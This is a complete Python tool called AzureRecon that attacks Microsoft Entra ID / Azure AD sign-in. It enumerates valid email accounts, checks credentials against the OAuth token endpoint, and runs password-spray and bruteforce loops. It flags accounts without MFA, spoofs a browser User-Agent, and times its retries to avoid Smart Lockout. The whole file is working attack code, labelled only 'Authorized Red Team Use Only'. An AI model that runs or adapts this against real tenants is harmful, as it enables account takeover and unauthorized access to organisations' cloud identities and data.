#!/usr/bin/env python3
# AzureRecon
# Azure / Entra ID Email Enumeration, MFA Check, Password Spray & Bruteforce
# Authorized Red Team Use Only

import requests
import argparse
import time
import json
import sys
import os
from datetime import datetime

# ==================== COLORS & STYLES ====================

RST = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
ITALIC = "\033[3m"
ULINE = "\033[4m"

# Foreground
BLACK = "\033[30m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"

# Background
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"
BG_GRAY = "\033[100m"

# ==================== CONSTANTS ====================

CREDENTIAL_TYPE_URL = "https://login.microsoftonline.com/common/GetCredentialType"
OAUTH_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/token"
AZURE_PS_CLIENT_ID = "1b730954-1685-4b74-9bfd-dac224a7b894"

HEADERS = {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
    ),
}

OAUTH_HEADERS = {
    "Accept": "application/json",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
    ),
}

# ==================== STATUS DISPLAY CONFIG ====================

STATUS_CONFIG = {
    # Enum statuses
    "EXISTS":              {"icon": "●", "label": "EXISTS",          "color": GREEN,  "bg": BG_GREEN,  "category": "exists"},
    "EXISTS_INVALID_PASS": {"icon": "●", "label": "EXISTS",          "color": GREEN,  "bg": BG_GREEN,  "category": "exists"},
    "EXISTS_VALID_MFA":    {"icon": "●", "label": "EXISTS+MFA",      "color": GREEN,  "bg": BG_GREEN,  "category": "exists"},
    "EXISTS_VALID_CA_MFA": {"icon": "●", "label": "EXISTS+CA/MFA",   "color": GREEN,  "bg": BG_GREEN,  "category": "exists"},
    "EXISTS_VALID_NO_MFA": {"icon": "●", "label": "EXISTS+NO MFA",   "color": GREEN,  "bg": BG_GREEN,  "category": "exists"},
    "EXISTS_LOCKED":       {"icon": "▲", "label": "EXISTS+LOCKED",   "color": YELLOW, "bg": BG_YELLOW, "category": "warning"},
    "EXISTS_DISABLED":     {"icon": "▲", "label": "EXISTS+DISABLED", "color": YELLOW, "bg": BG_YELLOW, "category": "warning"},
    "EXISTS_EXPIRED":      {"icon": "▲", "label": "EXISTS+EXPIRED",  "color": YELLOW, "bg": BG_YELLOW, "category": "warning"},
    "NOT_FOUND":           {"icon": "✗", "label": "NOT FOUND",       "color": RED,    "bg": BG_RED,    "category": "not_found"},
    "TENANT_NOT_FOUND":    {"icon": "✗", "label": "BAD TENANT",      "color": RED,    "bg": BG_RED,    "category": "not_found"},

    # Auth statuses
    "VALID_NO_MFA":        {"icon": "★", "label": "VALID · NO MFA",  "color": GREEN,  "bg": BG_GREEN,  "category": "valid"},
    "VALID_MFA":           {"icon": "◆", "label": "VALID · MFA",     "color": BLUE,   "bg": BG_BLUE,   "category": "valid_mfa"},
    "VALID_CA_MFA":        {"icon": "◆", "label": "VALID · CA/MFA",  "color": MAGENTA,"bg": BG_MAGENTA,"category": "valid_mfa"},
    "INVALID_PASS":        {"icon": "✗", "label": "BAD PASSWORD",    "color": RED,    "bg": BG_RED,    "category": "invalid"},
    "LOCKED":              {"icon": "⛔","label": "LOCKED",          "color": YELLOW, "bg": BG_YELLOW, "category": "locked"},
    "DISABLED":            {"icon": "⊘", "label": "DISABLED",        "color": YELLOW, "bg": BG_YELLOW, "category": "disabled"},
    "EXPIRED":             {"icon": "⏳","label": "PASS EXPIRED",    "color": YELLOW, "bg": BG_YELLOW, "category": "warning"},

    # Error statuses
    "THROTTLED":           {"icon": "⏱", "label": "THROTTLED",       "color": YELLOW, "bg": BG_YELLOW, "category": "error"},
    "NETWORK_ERROR":       {"icon": "✗", "label": "NET ERROR",       "color": RED,    "bg": BG_RED,    "category": "error"},
    "UNKNOWN":             {"icon": "?", "label": "UNKNOWN",         "color": DIM,    "bg": BG_GRAY,   "category": "error"},
    "WRONG_PASSWORD":      {"icon": "✗", "label": "BAD PASSWORD",    "color": RED,    "bg": BG_RED,    "category": "invalid"},
    "MFA_REQUIRED":        {"icon": "◆", "label": "MFA REQUIRED",    "color": BLUE,   "bg": BG_BLUE,   "category": "valid_mfa"},
    "CONDITIONAL_ACCESS":  {"icon": "◆", "label": "CA/MFA",          "color": MAGENTA,"bg": BG_MAGENTA,"category": "valid_mfa"},
    "NO_MFA":              {"icon": "★", "label": "NO MFA!",         "color": GREEN,  "bg": BG_GREEN,  "category": "valid"},
}

# ==================== TERMINAL HELPERS ====================

def term_width():
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80


def progress_bar(current, total, width=30):
    pct = current / total if total > 0 else 0
    filled = int(width * pct)
    bar = f"{GREEN}{'█' * filled}{DIM}{'░' * (width - filled)}{RST}"
    return f"{bar} {BOLD}{pct*100:5.1f}%{RST} ({current}/{total})"


def print_separator(char="─", color=DIM):
    w = term_width()
    print(f"{color}{char * w}{RST}")


def print_header_box(title, subtitle="", color=CYAN):
    w = min(term_width(), 70)
    inner = w - 4
    print(f"{color}╔{'═' * (w-2)}╗{RST}")
    pad_title = title.center(inner)
    print(f"{color}║{RST} {BOLD}{pad_title}{RST} {color}║{RST}")
    if subtitle:
        pad_sub = subtitle.center(inner)
        print(f"{color}║{RST} {DIM}{pad_sub}{RST} {color}║{RST}")
    print(f"{color}╚{'═' * (w-2)}╝{RST}")


def status_badge(status):
    cfg = STATUS_CONFIG.get(status, STATUS_CONFIG["UNKNOWN"])
    return f"{cfg['bg']}{BLACK}{BOLD} {cfg['label']} {RST}"


def status_icon(status):
    cfg = STATUS_CONFIG.get(status, STATUS_CONFIG["UNKNOWN"])
    return f"{cfg['color']}{cfg['icon']}{RST}"


def status_color(status):
    cfg = STATUS_CONFIG.get(status, STATUS_CONFIG["UNKNOWN"])
    return cfg["color"]

# ==================== OPSEC WARNINGS ====================

OPSEC_WARNING_OAUTH = f"""
{YELLOW}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                    ⚠  OPSEC WARNING  ⚠                      ║
╠══════════════════════════════════════════════════════════════╣
║  This mode generates sign-in log entries visible to:        ║
║    • Azure AD / Entra ID sign-in logs                       ║
║    • SIEM (Sentinel, Splunk, etc.)                          ║
║    • Identity Protection risk detections                    ║
║    • SOC dashboards                                         ║
║                                                             ║
║  Your IP, User-Agent, and client_id will be logged.         ║
║  Smart Lockout may trigger on repeated failures.            ║
║                                                             ║
║  Use --accept-risk to suppress this warning.                ║
╚══════════════════════════════════════════════════════════════╝{RST}
"""

OPSEC_WARNING_SPRAY = f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║               ⚠  HIGH RISK OPSEC WARNING  ⚠                ║
╠══════════════════════════════════════════════════════════════╣
║  Password spraying generates MANY sign-in log entries.      ║
║                                                             ║
║  Detection vectors:                                         ║
║    • Azure AD sign-in logs (every attempt logged)           ║
║    • Smart Lockout (per-user, per-IP thresholds)            ║
║    • Identity Protection: spray pattern detection           ║
║    • SIEM correlation rules (1 pass → N users = spray)      ║
║    • Conditional Access: location/device anomalies          ║
║    • Microsoft auto-detects spray patterns since 2023       ║
║                                                             ║
║  Mitigations applied by this tool:                          ║
║    • Configurable delay between attempts (--delay)          ║
║    • Auto-stop on lockout threshold (--max-lockouts)        ║
║    • Spray order: 1 password across ALL users before next   ║
║                                                             ║
║  Use --accept-risk to suppress this warning.                ║
╚══════════════════════════════════════════════════════════════╝{RST}
"""


# ==================== BANNER ====================

def banner():
    print(rf"""
{CYAN}{BOLD}    ___                        ____
   /   |____  __  __________  / __ \___  _________  ____
  / /| /_  / / / / / ___/ _ \/ /_/ / _ \/ ___/ __ \/ __ \
 / ___ |/ /_/ /_/ / /  /  __/ _, _/  __/ /__/ /_/ / / / /
/_/  |_/___/\__,_/_/   \___/_/ |_|\___/\___/\____/_/ /_/{RST}

{DIM}  Azure / Entra ID Recon & Spray Tool{RST}
{YELLOW}  ⚠  AUTHORIZED RED TEAM USE ONLY{RST}
""")


# ==================== ARG PARSING ====================

def parse_args():
    parser = argparse.ArgumentParser(
        description="AzureRecon - Azure AD/Entra ID Enumeration, MFA Check & Password Spray"
    )

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--enum", action="store_true",
                      help="Email enumeration (check if users exist)")
    mode.add_argument("--mfa", action="store_true",
                      help="MFA check (single email + password)")
    mode.add_argument("--spray", action="store_true",
                      help="Password spray (1 password → many users)")
    mode.add_argument("--brute", action="store_true",
                      help="Bruteforce (many passwords → 1 or many users)")

    email_group = parser.add_mutually_exclusive_group(required=True)
    email_group.add_argument("-e", "--email", help="Single email")
    email_group.add_argument("-E", "--emaillist", help="File with emails (one per line)")

    parser.add_argument("-p", "--password", help="Single password")
    parser.add_argument("-P", "--passlist", help="File with passwords (one per line)")
    parser.add_argument("--oauth", action="store_true",
                        help="Use OAuth /token endpoint for enum (loud)")
    parser.add_argument("--accept-risk", action="store_true",
                        help="Suppress OPSEC warnings")
    parser.add_argument("--delay", type=float, default=None,
                        help="Delay between requests (default: 0.5 enum, 2.0 oauth, 1.5 spray)")
    parser.add_argument("--spray-wait", type=float, default=300,
                        help="Wait seconds between password rounds in spray mode (default: 300)")
    parser.add_argument("--max-lockouts", type=int, default=3,
                        help="Stop after N lockouts detected (default: 3, 0=disable)")
    parser.add_argument("--force", action="store_true",
                        help="Continue on lockouts (overrides --max-lockouts)")
    parser.add_argument("-o", "--outfile", help="Write results to file")
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if args.mfa and not args.password:
        parser.error("--mfa requires -p/--password")
    if args.spray and not args.password and not args.passlist:
        parser.error("--spray requires -p or -P")
    if args.brute and not args.password and not args.passlist:
        parser.error("--brute requires -p or -P")

    if args.delay is None:
        if args.enum and not args.oauth:
            args.delay = 0.5
        elif args.spray:
            args.delay = 1.5
        elif args.brute:
            args.delay = 2.0
        else:
            args.delay = 2.0

    return args


def load_list(path, desc):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except IOError:
        print(f"{RED}  ✗ Failed to read {desc}: {path}{RST}")
        sys.exit(1)


# ==================== CORE AUTH FUNCTION ====================

def oauth_attempt(email, password):
    data = {
        "resource": "https://graph.windows.net",
        "client_id": AZURE_PS_CLIENT_ID,
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }

    try:
        r = requests.post(OAUTH_TOKEN_URL, data=data, headers=OAUTH_HEADERS, timeout=10)

        if r.status_code == 200:
            return "VALID_NO_MFA", "Authentication successful — account has NO MFA protection"

        body = r.text
        code_map = [
            ("AADSTS50034", "NOT_FOUND",        "User does not exist in this tenant"),
            ("AADSTS50126", "INVALID_PASS",      "Password is incorrect"),
            ("AADSTS50079", "VALID_MFA",         "Valid credentials — MFA required (Authenticator/SMS/TOTP)"),
            ("AADSTS50076", "VALID_MFA",         "Valid credentials — MFA required"),
            ("AADSTS50158", "VALID_CA_MFA",      "Valid credentials — Conditional Access enforcing MFA"),
            ("AADSTS50053", "LOCKED",            "Account locked by Smart Lockout — too many failed attempts"),
            ("AADSTS50057", "DISABLED",          "Account is disabled by admin"),
            ("AADSTS50055", "EXPIRED",           "Password has expired — needs reset"),
            ("AADSTS50128", "TENANT_NOT_FOUND",  "Tenant/domain does not exist"),
            ("AADSTS50059", "TENANT_NOT_FOUND",  "Tenant/domain does not exist"),
        ]

        for aad_code, status, detail in code_map:
            if aad_code in body:
                return status, detail

        return "UNKNOWN", body[:300]

    except requests.RequestException as e:
        return "NETWORK_ERROR", str(e)


# ==================== ENUM FUNCTIONS ====================

def enum_getcredentialtype(email):
    payload = {
        "Username": email,
        "IsOtherIdpSupported": True,
        "CheckPhones": False,
        "IsRemoteNGCSupported": True,
        "IsCookieBannerShown": False,
        "IsFidoSupported": True,
        "Forceotclogin": False,
        "Country": "US",
        "Flowtoken": "",
    }

    try:
        r = requests.post(CREDENTIAL_TYPE_URL, json=payload, headers=HEADERS, timeout=10)
        data = r.json()

        if_exists = data.get("IfExistsResult", -1)
        throttle = data.get("ThrottleStatus", 0)

        if throttle == 1:
            return "THROTTLED", "Rate limited by Microsoft — slow down", data

        if if_exists in (0, 5, 6):
            domain_type = data.get("EstsProperties", {}).get("DomainType", None)
            fed = " (federated IdP — ADFS/Okta/etc)" if domain_type == 4 else " (managed — cloud auth)"
            return "EXISTS", f"User exists in tenant{fed}", data
        elif if_exists == 1:
            return "NOT_FOUND", "User does not exist in this tenant", data
        else:
            return "UNKNOWN", f"Unexpected IfExistsResult={if_exists}", data

    except requests.RequestException as e:
        return "NETWORK_ERROR", str(e), None


def enum_oauth(email):
    status, detail = oauth_attempt(email, "InvalidPasswordForEnumOnly_X9k!mZ")
    exists_statuses = ("INVALID_PASS", "VALID_MFA", "VALID_CA_MFA", "VALID_NO_MFA",
                       "LOCKED", "DISABLED", "EXPIRED")
    if status in exists_statuses:
        return f"EXISTS_{status}", f"User exists — {detail}", None
    return status, detail, None


# ==================== RESULT OUTPUT ====================

def print_result(email, status, detail, password=None, counter=None, total=None):
    cfg = STATUS_CONFIG.get(status, STATUS_CONFIG["UNKNOWN"])
    color = cfg["color"]
    icon = cfg["icon"]

    # Progress counter
    progress = ""
    if counter is not None and total is not None:
        progress = f"{DIM}[{counter}/{total}]{RST} "

    # Badge
    badge = status_badge(status)

    # Credential display
    if password:
        cred = f"{BOLD}{email}{RST}{DIM}:{RST}{password}"
    else:
        cred = f"{BOLD}{email}{RST}"

    # Main line
    print(f"  {progress}{color}{icon}{RST}  {badge}  {cred}")

    # Detail on next line, indented
    indent = "        "
    if counter is not None:
        indent = "               "
    print(f"{indent}{DIM}└─ {detail}{RST}")

    # Extra visual emphasis for critical findings
    if status in ("VALID_NO_MFA", "EXISTS_VALID_NO_MFA", "NO_MFA"):
        print(f"{indent}   {BG_GREEN}{BLACK}{BOLD} !!! NO MFA — DIRECT ACCESS POSSIBLE !!! {RST}")
    elif status in ("VALID_MFA", "VALID_CA_MFA", "EXISTS_VALID_MFA", "EXISTS_VALID_CA_MFA", "MFA_REQUIRED", "CONDITIONAL_ACCESS"):
        print(f"{indent}   {BG_BLUE}{WHITE}{BOLD} VALID CREDS — MFA blocks direct access {RST}")
    elif status in ("LOCKED", "EXISTS_LOCKED"):
        print(f"{indent}   {BG_YELLOW}{BLACK} ⚠ Smart Lockout triggered — consider increasing delay {RST}")

    print()


def print_result_compact(email, status, detail, password=None, counter=None, total=None):
    cfg = STATUS_CONFIG.get(status, STATUS_CONFIG["UNKNOWN"])
    color = cfg["color"]
    icon = cfg["icon"]

    progress = ""
    if counter is not None and total is not None:
        progress = f"{DIM}[{counter}/{total}]{RST} "

    if password:
        cred = f"{email}:{password}"
    else:
        cred = email

    print(f"  {progress}{color}{icon}{RST}  {color}{cfg['label']:16s}{RST} {cred} {DIM}— {detail}{RST}")


# ==================== CLASSIFICATION HELPERS ====================

def is_exists(status):
    return status.startswith("EXISTS") or status in (
        "VALID_NO_MFA", "VALID_MFA", "VALID_CA_MFA", "LOCKED", "DISABLED", "EXPIRED",
        "NO_MFA", "MFA_REQUIRED", "CONDITIONAL_ACCESS"
    )

def is_valid_creds(status):
    return status in ("VALID_NO_MFA", "VALID_MFA", "VALID_CA_MFA",
                       "NO_MFA", "MFA_REQUIRED", "CONDITIONAL_ACCESS")

def is_lockout(status):
    return status in ("LOCKED", "EXISTS_LOCKED")

def is_interesting(status):
    return status not in ("INVALID_PASS", "NOT_FOUND")


# ==================== SUMMARY ====================

def print_summary(results, mode):
    w = min(term_width(), 70)

    print()
    print_separator("═", CYAN)
    print(f"{CYAN}{BOLD}  RESULTS SUMMARY{RST}")
    print_separator("═", CYAN)
    print()

    # Categorize
    valid_no_mfa = [r for r in results if r["status"] in ("VALID_NO_MFA", "NO_MFA", "EXISTS_VALID_NO_MFA")]
    valid_mfa = [r for r in results if r["status"] in ("VALID_MFA", "VALID_CA_MFA", "MFA_REQUIRED", "CONDITIONAL_ACCESS", "EXISTS_VALID_MFA", "EXISTS_VALID_CA_MFA")]
    exists_list = [r for r in results if is_exists(r["status"]) and r not in valid_no_mfa and r not in valid_mfa]
    not_found_list = [r for r in results if r["status"] in ("NOT_FOUND", "TENANT_NOT_FOUND")]
    locked_list = [r for r in results if is_lockout(r["status"])]
    disabled_list = [r for r in results if r["status"] in ("DISABLED", "EXISTS_DISABLED")]
    expired_list = [r for r in results if r["status"] in ("EXPIRED", "EXISTS_EXPIRED")]
    error_list = [r for r in results if r["status"] in ("NETWORK_ERROR", "THROTTLED", "UNKNOWN")]

    unique_emails = set(r["email"] for r in results)

    # Stats bar
    stats = [
        (f"{GREEN}●{RST} Valid (no MFA)", len(valid_no_mfa)),
        (f"{BLUE}◆{RST} Valid (MFA)", len(valid_mfa)),
        (f"{GREEN}●{RST} Exists", len(exists_list)),
        (f"{RED}✗{RST} Not found", len(not_found_list)),
        (f"{YELLOW}⛔{RST} Locked", len(locked_list)),
        (f"{YELLOW}⊘{RST} Disabled", len(disabled_list)),
        (f"{YELLOW}⏳{RST} Expired", len(expired_list)),
    ]

    print(f"  {BOLD}Emails tested:{RST} {len(unique_emails)}    {BOLD}Total requests:{RST} {len(results)}")
    print()

    for label, count in stats:
        if count > 0:
            bar_len = min(count * 2, 30)
            bar_color = GREEN if "Valid" in label or "Exists" in label else RED if "Not" in label else YELLOW
            bar = f"{bar_color}{'█' * bar_len}{RST}"
            print(f"  {label:40s} {BOLD}{count:4d}{RST}  {bar}")

    # ===== VALID CREDS (NO MFA) — highest priority =====
    if valid_no_mfa:
        print()
        print(f"  {BG_GREEN}{BLACK}{BOLD} ★ VALID CREDENTIALS — NO MFA ★ {RST}")
        print(f"  {GREEN}{'─' * 40}{RST}")
        for r in valid_no_mfa:
            pw = f":{r['password']}" if "password" in r else ""
            print(f"  {GREEN}{BOLD}  ★  {r['email']}{pw}{RST}")
            print(f"  {DIM}     └─ {r['detail']}{RST}")
        print(f"  {GREEN}{'─' * 40}{RST}")
        print(f"  {GREEN}{BOLD}  Direct access possible to {len(valid_no_mfa)} account(s){RST}")

    # ===== VALID CREDS (MFA) =====
    if valid_mfa:
        print()
        print(f"  {BG_BLUE}{WHITE}{BOLD} ◆ VALID CREDENTIALS — MFA ENABLED ◆ {RST}")
        print(f"  {BLUE}{'─' * 40}{RST}")
        for r in valid_mfa:
            pw = f":{r['password']}" if "password" in r else ""
            mfa_type = "Conditional Access" if r["status"] in ("VALID_CA_MFA", "CONDITIONAL_ACCESS", "EXISTS_VALID_CA_MFA") else "MFA (Push/TOTP/SMS)"
            print(f"  {BLUE}{BOLD}  ◆  {r['email']}{pw}{RST}")
            print(f"  {DIM}     └─ Protection: {mfa_type}{RST}")
        print(f"  {BLUE}{'─' * 40}{RST}")
        print(f"  {BLUE}  Creds valid but MFA blocks direct auth on {len(valid_mfa)} account(s){RST}")

    # ===== EXISTS (enum mode) =====
    if exists_list and mode in ("enum",):
        print()
        print(f"  {BG_GREEN}{BLACK}{BOLD} ● EXISTING ACCOUNTS ● {RST}")
        print(f"  {GREEN}{'─' * 40}{RST}")
        for r in exists_list:
            print(f"  {GREEN}  ●  {r['email']}{RST}")
            print(f"  {DIM}     └─ {r['detail']}{RST}")

    # ===== LOCKED =====
    if locked_list:
        print()
        unique_locked = list(set(r["email"] for r in locked_list))
        print(f"  {BG_YELLOW}{BLACK}{BOLD} ⛔ LOCKED ACCOUNTS ({len(unique_locked)}) {RST}")
        print(f"  {YELLOW}{'─' * 40}{RST}")
        for email in unique_locked:
            print(f"  {YELLOW}  ⛔  {email}{RST}")
        print(f"  {DIM}  Smart Lockout triggered — accounts temporarily locked{RST}")

    # ===== DISABLED =====
    if disabled_list:
        print()
        unique_disabled = list(set(r["email"] for r in disabled_list))
        print(f"  {BG_YELLOW}{BLACK}{BOLD} ⊘ DISABLED ACCOUNTS ({len(unique_disabled)}) {RST}")
        print(f"  {YELLOW}{'─' * 40}{RST}")
        for email in unique_disabled:
            print(f"  {YELLOW}  ⊘  {email}{RST}")

    # ===== EXPIRED =====
    if expired_list:
        print()
        unique_expired = list(set(r["email"] for r in expired_list))
        print(f"  {BG_YELLOW}{BLACK}{BOLD} ⏳ EXPIRED PASSWORDS ({len(unique_expired)}) {RST}")
        print(f"  {YELLOW}{'─' * 40}{RST}")
        for email in unique_expired:
            print(f"  {YELLOW}  ⏳  {email}{RST}")

    # ===== NOT FOUND =====
    if not_found_list and mode in ("enum",):
        print()
        print(f"  {RED}✗ Not found: {len(not_found_list)} email(s){RST}")

    # ===== ERRORS =====
    if error_list:
        print()
        print(f"  {DIM}? Errors/Throttled: {len(error_list)}{RST}")

    print()
    print_separator("═", CYAN)


# ==================== MAIN ====================

def main():
    banner()
    args = parse_args()

    emails = [args.email] if args.email else load_list(args.emaillist, "email list")
    passwords = []
    if args.passlist:
        passwords = load_list(args.passlist, "password list")
    elif args.password:
        passwords = [args.password]

    # OPSEC warning
    is_loud = args.oauth or args.mfa or args.spray or args.brute
    if is_loud and not args.accept_risk:
        warning = OPSEC_WARNING_SPRAY if (args.spray or args.brute) else OPSEC_WARNING_OAUTH
        print(warning)
        try:
            answer = input(f"  {YELLOW}⚠{RST}  Continue? [{GREEN}y{RST}/{RED}N{RST}] ").strip().lower()
            if answer != "y":
                print(f"\n  {RED}✗ Aborted.{RST}\n")
                sys.exit(0)
        except KeyboardInterrupt:
            print(f"\n  {RED}✗ Aborted.{RST}\n")
            sys.exit(0)
        print()

    # Mode config
    mode_key = "enum" if args.enum else "mfa" if args.mfa else "spray" if args.spray else "brute"
    mode_labels = {"enum": "EMAIL ENUMERATION", "mfa": "MFA CHECK", "spray": "PASSWORD SPRAY", "brute": "BRUTEFORCE"}

    if args.enum:
        method = "OAuth /token" if args.oauth else "GetCredentialType"
        opsec_label = f"{RED}{BOLD}LOUD{RST}" if args.oauth else f"{GREEN}{BOLD}STEALTH{RST}"
    else:
        method = "OAuth /token"
        opsec_label = f"{RED}{BOLD}LOUD{RST}"

    total = len(emails) * max(len(passwords), 1)

    # Config display
    print_separator("─", DIM)
    print(f"  {BOLD}MODE{RST}      {CYAN}{mode_labels[mode_key]}{RST}")
    print(f"  {BOLD}METHOD{RST}    {method}")
    print(f"  {BOLD}OPSEC{RST}     {opsec_label}")
    print(f"  {BOLD}TARGETS{RST}   {len(emails)} email(s)")
    if passwords:
        print(f"  {BOLD}PASSWORDS{RST} {len(passwords)}")
    print(f"  {BOLD}REQUESTS{RST}  {total}")
    print(f"  {BOLD}DELAY{RST}     {args.delay}s")
    if args.spray and len(passwords) > 1:
        print(f"  {BOLD}COOLDOWN{RST}  {args.spray_wait}s between rounds")
    print(f"  {BOLD}STARTED{RST}   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print_separator("─", DIM)
    print()

    results = []
    lockouts = 0
    attempt = 0
    abort = False
    start_time = time.time()

    # ========== ENUM MODE ==========
    if args.enum:
        for i, email in enumerate(emails):
            if args.oauth:
                status, detail, raw = enum_oauth(email)
            else:
                status, detail, raw = enum_getcredentialtype(email)

            print_result(email, status, detail, counter=i+1, total=len(emails))
            results.append({"email": email, "status": status, "detail": detail})

            if status == "THROTTLED":
                print(f"  {YELLOW}⏱  Throttled — backing off 10s...{RST}\n")
                time.sleep(10)
            elif i < len(emails) - 1:
                time.sleep(args.delay)

    # ========== MFA CHECK MODE ==========
    elif args.mfa:
        for i, email in enumerate(emails):
            status, detail = oauth_attempt(email, args.password)
            print_result(email, status, detail, password=args.password, counter=i+1, total=len(emails))
            results.append({"email": email, "password": args.password, "status": status, "detail": detail})

            if i < len(emails) - 1:
                time.sleep(args.delay)

    # ========== SPRAY MODE ==========
    elif args.spray:
        for pi, password in enumerate(passwords):
            if abort:
                break

            print_header_box(
                f"ROUND {pi+1}/{len(passwords)}",
                f"Password: {password}",
                CYAN
            )
            print()

            round_valid = 0
            for ui, email in enumerate(emails):
                if abort:
                    break

                attempt += 1
                status, detail = oauth_attempt(email, password)

                if is_interesting(status) or args.verbose:
                    print_result(email, status, detail, password=password,
                                counter=attempt, total=total)
                else:
                    print_result_compact(email, status, detail, password=password,
                                        counter=attempt, total=total)

                results.append({"email": email, "password": password, "status": status, "detail": detail})

                if is_valid_creds(status):
                    round_valid += 1

                if is_lockout(status):
                    lockouts += 1
                    if not args.force and args.max_lockouts > 0 and lockouts >= args.max_lockouts:
                        print()
                        print(f"  {BG_RED}{WHITE}{BOLD} ⛔ LOCKOUT THRESHOLD REACHED ({lockouts}) — STOPPING {RST}")
                        print(f"  {DIM}  Use --force to override or --max-lockouts 0 to disable{RST}")
                        print()
                        abort = True

                if ui < len(emails) - 1 and not abort:
                    time.sleep(args.delay)

            # Round summary
            if not abort:
                print_separator("─", DIM)
                print(f"  {DIM}Round {pi+1} complete — {round_valid} valid hit(s){RST}")

            # Cooldown between rounds
            if pi < len(passwords) - 1 and not abort:
                wait = args.spray_wait
                print()
                print(f"  {YELLOW}⏱{RST}  {BOLD}Cooldown:{RST} waiting {wait}s before next password")
                print(f"  {DIM}   (Smart Lockout reset window — adjust with --spray-wait){RST}")
                print()

                # Countdown display
                remaining = int(wait)
                while remaining > 0:
                    mins, secs = divmod(remaining, 60)
                    bar_pct = 1.0 - (remaining / wait)
                    bar_w = 25
                    filled = int(bar_w * bar_pct)
                    bar = f"{CYAN}{'█' * filled}{'░' * (bar_w - filled)}{RST}"
                    print(f"\r  {bar} {BOLD}{mins:02d}:{secs:02d}{RST} remaining  ", end="", flush=True)
                    time.sleep(1)
                    remaining -= 1
                print(f"\r  {CYAN}{'█' * 25}{RST} {GREEN}{BOLD}READY{RST}                  ")
                print()

    # ========== BRUTE MODE ==========
    elif args.brute:
        for ui, email in enumerate(emails):
            if abort:
                break

            if len(emails) > 1:
                print_header_box(
                    f"TARGET {ui+1}/{len(emails)}",
                    email,
                    CYAN
                )
                print()

            for pi, password in enumerate(passwords):
                if abort:
                    break

                attempt += 1
                status, detail = oauth_attempt(email, password)

                if is_interesting(status) or args.verbose:
                    print_result(email, status, detail, password=password,
                                counter=attempt, total=total)
                else:
                    print_result_compact(email, status, detail, password=password,
                                        counter=attempt, total=total)

                results.append({"email": email, "password": password, "status": status, "detail": detail})

                if is_valid_creds(status):
                    break

                if is_lockout(status):
                    lockouts += 1
                    if not args.force and args.max_lockouts > 0 and lockouts >= args.max_lockouts:
                        print()
                        print(f"  {BG_RED}{WHITE}{BOLD} ⛔ LOCKOUT THRESHOLD REACHED ({lockouts}) — STOPPING {RST}")
                        abort = True
                    break

                if status == "NOT_FOUND":
                    break

                if pi < len(passwords) - 1:
                    time.sleep(args.delay)

    # ========== TIMING ==========
    elapsed = time.time() - start_time
    mins, secs = divmod(int(elapsed), 60)

    print()
    print_separator("─", DIM)
    print(f"  {BOLD}FINISHED{RST}  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  {DIM}({mins}m {secs}s elapsed){RST}")
    print_separator("─", DIM)

    # ========== SUMMARY ==========
    print_summary(results, mode_key)

    # ========== FILE OUTPUT ==========
    if args.outfile:
        try:
            with open(args.outfile, "w", encoding="utf-8") as f:
                if args.json:
                    json.dump(results, f, indent=2)
                else:
                    for r in results:
                        pw = f":{r['password']}" if "password" in r else ""
                        f.write(f"{r['email']}{pw}|{r['status']}|{r['detail']}\n")
            print(f"  {BLUE}●{RST}  Results saved to {BOLD}{args.outfile}{RST}")
        except IOError:
            print(f"  {RED}✗{RST}  Failed to write: {args.outfile}")
        print()

    if args.json and not args.outfile:
        print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
